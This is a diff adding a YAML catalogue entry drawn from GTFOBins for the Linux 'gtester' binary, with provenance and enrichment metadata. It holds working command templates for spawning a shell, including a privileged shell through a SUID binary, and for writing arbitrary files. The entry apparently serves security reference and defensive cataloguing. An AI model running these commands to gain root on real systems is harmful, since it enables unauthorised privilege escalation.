@@ -1,0 +1,103 @@
+id: gtfobins/gtester/shell/suid
+type: binary
+platform: linux
+name: gtester
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: 'echo ''#!/bin/sh -p'' >/path/to/temp-file
+
+    echo ''exec /bin/sh -p 0<&1'' >>/path/to/temp-file
+
+    chmod +x /path/to/temp-file
+
+    gtester -q /path/to/temp-file'
+references:
+- https://gtfobins.github.io/gtfobins/gtester/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        gtester:
+          functions:
+            file-write:
+            - code: gtester DATA -o /path/to/output-file
+              comment: Data to be written appears in an XML attribute in the output file (`<testbinary
+                path="DATA">`).
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            shell:
+            - code: 'echo ''exec /bin/sh 0<&1'' >/path/to/temp-file
+
+                chmod +x /path/to/temp-file
+
+                gtester -q /path/to/temp-file'
+              contexts:
+                sudo: null
+                suid:
+                  code: 'echo ''#!/bin/sh -p'' >/path/to/temp-file
+
+                    echo ''exec /bin/sh -p 0<&1'' >>/path/to/temp-file
+
+                    chmod +x /path/to/temp-file
+
+                    gtester -q /path/to/temp-file'
+                  shell: false
+                unprivileged: null
+    upstream_url: https://gtfobins.github.io/gtfobins/gtester/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: shell
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: suid
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:3ba7e780c0359b21f959a18dd131b1f4c6e5a911947a9d9358852f11801a401f
